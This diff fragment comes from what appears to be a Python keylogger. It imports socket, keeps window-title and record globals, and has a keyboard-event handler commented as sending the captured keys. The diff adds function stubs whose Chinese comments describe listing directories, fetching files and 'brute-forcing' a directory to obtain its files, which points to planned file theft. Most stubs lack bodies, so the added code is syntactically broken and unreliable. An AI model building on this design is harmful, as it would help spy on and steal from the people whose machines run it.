@@ -12,6 +12,18 @@ import socket
 currenttitle=''
 lasttitle=''
 jilu=[]
+def getlocaldir():
+	#获得当前路径
+	pass
+def getlocalfiledir():
+	#获取当前路径下文件
+def getthetopfiledir():
+	#获取上届路径文件目录
+def getfile(path,name):
+	#获取文件
+def boomwenjian(path):
+	#爆破并获得指定目录下文件
+
 #键盘事件处理，并且发送
 def onKeyboardEvent(event):
     global s
